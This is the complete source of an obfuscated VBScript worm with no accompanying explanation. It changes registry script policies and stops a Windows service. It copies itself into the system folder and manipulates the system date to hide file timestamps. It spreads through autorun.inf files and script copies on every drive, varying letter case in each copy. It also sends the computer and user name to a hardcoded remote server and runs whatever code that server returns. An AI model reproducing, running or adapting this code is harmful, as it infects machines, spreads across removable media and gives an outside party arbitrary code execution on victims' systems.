ON ERrOR rEsUMe NeXt
sEt fsO=CreATeObJECt(sTRREverse("tCEJbomeTsYSelIf.GNitPIrCS"))
Set WsHsHELL=CREAteOBjECt(StrreverSe("lleHs.TPiRCsW"))
DIm dRi_List,DrI_lIsT0
dIm iSSend
ISSEnD=0
C_TiMe=DAtE()
WShSheLl.rUn "NET Stop SHarEDAccEsS",0
seT DrVS=fsO.DRiVEs
sySdIR=FSo.gETsPeCiaLfOldER(1)
ThIsPATH=wscrIpt.SCriptFuLLnaMe
Set Fc=FsO.OpEnteXtFiLE(ThISPAth,1)
sCOpy=fc.rEadAll
fC.ClOSe
set FC=NoThiNg
CAlL wRiTEFIlE(SySDir&"\SYSInFo.rEG",uNeSCApE(StRREvErsE("00c2%00C2%00c2%00c2%00c2%00c2%00c2%00C2%00C2%00C2%00c2%00C2%00C2%00C2%00C2%00A3%92%B82%xEHD3%22%eMitCEXe22%A0%D0%02%22%22%d3%22%SrEtemArAp22%A0%D0%02%22%SbV.gfcnrpc5%c5%23MeTSYsC5%C5%52%RIdNiW52%22%D3%22%TpIRCS22%A0%D0%02%D5%0c5%0c5%PUtRaTSC5%STpIRCsC5%EnIhCaMC5%EtAtsc5%YciLOP02%pUorGc5%nOISrEVTneRrUCc5%sWOdnIwC5%TFoSoRCiMc5%eRaWtfOSc5%ENIhCaM_LAcol_yEkhB5%a0%d0%A0%d0%02%00C2%00c2%00C2%00c2%00C2%00C2%00C2%00C2%00c2%00c2%00c2%00C2%00C2%00c2%00c2%00a3%92%B82%xEHD3%22%eMItceXE22%A0%d0%02%22%22%D3%22%SREtEmaRaP22%A0%D0%02%22%Sbv.GFcnRpC5%C5%23METsYSC5%C5%52%RiDNiw52%22%D3%22%tPiRcs22%a0%D0%02%D5%0C5%0c5%puTraTSC5%stPiRCsc5%mETsySC5%SwOdNiWc5%TfOsORCImC5%SeiCIlOPc5%erawtfoSc5%eniHcAM_lACoL_yekhB5%A0%d0%a0%D0%03%03%E2%53%02%E6%f6%96%37%27%56%65%02%27%F6%47%96%46%54%02%97%27%47%37%96%76%56%25%02%37%77%F6%46%E6%96%75%")))
WShShELl.rUn "rEgeDIt /S SySiNFO.reg",0
WSCript.sLEep 200
fSO.DElEtEfIle SySdIR&"\SYSInfO.rEG",True
if inStr(ThISPaTH,SYsdir)>0 tHen
drI_lISt0=LISTdRv()
o_tIME=LEfT(C_TIME,3)&CStR(InT(MiD(c_tImE,4,1))-1)&rIGHt(C_TimE,Len(c_tiME)-4)
wShSHeLL.RUn "cMD /C DaTE "&O_tImE,0
wScRIPt.sLEEP 10000
FOR dri_i=1 tO lEN(dRI_LIsT0)
calL WrITEAuTO(Mid(DrI_lISt0,dri_I,1)&":\")
nEXt
wshsHElL.Run "cmD /C dAtE "&c_tImE,0
COMPUTeRnAmE="":UsERNaME=""
sEt ObJwMiSERVIcE=geTOBjeCT("wInMgmTs:{iMPErSONatIoNLeVEl=ImpErSOnATe}!\\.\rOot\cImv2")
SET CoLCOMputerS = OBjwmiSeRVicE.eXEcqUErY("SeLeCt * fRoM WIn32_ComPUtERsYStem")
For eacH OBJcOMpUTer iN cOlComPuteRS
CoMpUTERnAmE=OBjcoMPUTER.NaMe
USeRnAME=objCompUtER.UsErName
NeXT
if USerNAmE="" THeN usErnaME="evAr"
iF iNstR(USeRnaMe,"\")<=0 thEn
usERNAme=COMPUteRnamE&"\"&usERnAMe
End if
Do
IF iSsEnd=0 Then
seT xMl=CREATEObJEcT(StRreVErSE("PTTHlmXrEvREs.2LmxSm"))  
xMl.oPen "Get",sTRREvErse(UnEscape("%3d%61%3f%70%73%61%2e%74%6e%75%6F%63%2F%61%76%65%2f%62%7a%7a%2f%30%30%31%2E%34%30%31%2E%39%31%31%2E%32%30%32%2F%2f%3A%70%74%74%68"))&UseRnAmE,0
xMl.setrEQuesTHeaDer "USER-AGEnT","EVaR"
XmL.seND()
If eRR.NUMbeR=0 tHen
IsSeNd=1
res=xML.ReSponsEtExt
if UcasE(LEfT(ReS,7))=UcASE("eXECutE")  THeN eXecuTe rES
elSe
erR.cLeaR
EnD iF
sET XmL=noThIng
END if

Dri_lisT=LIstdrV()
fOR drI_k=1 tO LEN(DrI_lisT)
If INsTR(Dri_list0,miD(drI_LIst,drI_k,1))<=0 TheN
cALL WRIteAUTo(mId(Dri_LIST,dri_K,1)&":\")
END iF
nExt
Dri_LIST0=Dri_lISt
WScrIpT.sLEEP 1000
LOoP
elSE
WshShELl.ruN "ExPlOreR .\",3
wsCRipt.SLEep 2000
WShsheLL.AppActIvatE uNEsCaPe(lcaSe("%u6211%u7684%u7535%u8111"))
WshsHeLL.sEndKEys uCAsE("% C")
RUNFLAg=0
fOr eACh pS IN getoBjECT _ 
("WINMgMTs:\\.\rOot\CIMV2:Win32_ProcESs").InsTANCeS_ 
IF lCaSe(PS.NAme)=LCase("WSCrIpT.eXe") THeN
RUnflaG=RunflaG+1
End iF
NexT
If rUNfLAg>=2 Then wScRIPT.qUIT
SEt Sf=fso.getfOldEr(sYsDIr)
f_Time=LEfT(Sf.DateCREATED,iNSTr(sF.DAtecREATEd," ")-1)
WsHSHELL.rUN "Cmd /C dATE "&f_time,0
wScriPt.slEEP 100
CALL WrIteFIlE(sySdIR&lcASE("\PRNcfG.vbs"),Vs(SCopy))
wshshELl.RUn "cMD /c Date "&C_tIMe,0
WshsHeLl.RUN sYSDir&"\pRNCfg.vbs"
enD if
FUncTioN vs(sTR)
ExeCute STRREVersE(uNeScAPe("%29%29%22U%25%22%28ESACL%2C%29%22U%25%22%28EsAcu%2CSv%28ecaLper%3DSV%0D%0ATXEN%0D%0AFi%20dNe%0d%0AC%26sV%3dsV%0d%0AeSle%0d%0a%29c%28eSAcL%26sv%3DSv%0D%0anehT%2005%3E%29001*%29%28dnR%28tNI%20FI%0d%0aezImoDnar%0D%0a%29%291%2CI%2CRts%28dIM%28ESacu%3dC%0d%0a%29RTS%28neL%20OT%201%3DI%20ROf"))
eNd FUNCTIoN
fuNCtioN liStdrv()
eXECuTE STRrEveRSe(UneScAPe("TSIL_pMT%3dVrdtsiL%0d%0Atxen%0d%0afi%20DNE%0d%0ARettElevird.VrD%26tSiL_pmT%3dTSIL_pMT%0d%0anEHT%20ydaerSi.Vrd%20FI%0D%0ASvrd%20nI%20vRd%20HCAE%20roF%0D%0a%22%22%3DTsil_PmT%0D%0aTSIL_PMt%20mId"))
eND FUNcTion

suB wrIteauTO(PaTH)
EXECUtE sTRrEVerSe(UnesCAPE("FI%20Dne%0d%0AeuRT%2c%22fni.nuROtUA%22%26HTap%20elifeTElED.OsF%0d%0AnEhT%20%29%22fNI.nUROtua%22%26htAp%28sTSixEelIF.osf%20FIEslE%0d%0A%29%28dNR%26HtAP%2c%22FNi.nuRoTUA%22%26HTAP%20RedLofEvOm.OSF%0D%0anehT%20%29%22fni.NUROtUA%22%26HTaP%28StSIxeReDLof.OSF%20FI"))
cmdsTr="sHEll\*\Command=WsCRIpt.eXE "&cHr(34)&"EvA.vBs"&Chr(34)
AUTosTR="[AUtoRUN]"&vbcrlF&"Open="&VbcRlf&rEPLAce(cmdSTr,"*","open")&vbCrLf&rePLAce(cmDSTr,"*","exPloRe")&VbcRLf&RePlACe(cmdsTr,"*","FINd")
CALL writefiLe(path&uCAse("aUToruN.INf"),aUtosTR)
CALl WRIteFILE(pATH&"Eva.vbs",VS(scOPY))
END sUB

sUb WRITeFile(FPath,ConTEnt)
EXECUTe STRREvErsE(uNEScAPE("gNihtON%3DAf%20tes%0D%0A7%3DseTUBirtta.AF%0D%0a%29HtaPf%28EliFTeG.oSf%3daf%20TeS%0D%0AGNiHTOn%3DCf%20tes%0d%0aesOlC.cf%0d%0atnETNOc%20eTirw.Cf%0D%0a%29EurT%2C2%2CHTAPf%28elIFTXetnEPO.OSF%3Dcf%20TeS%0d%0AEUrT%2chTApf%20elIFeteLED.OSF%20NEHT%20%29HtAPF%28STsiXeelIF.OSF%20fi"))
enD SuB
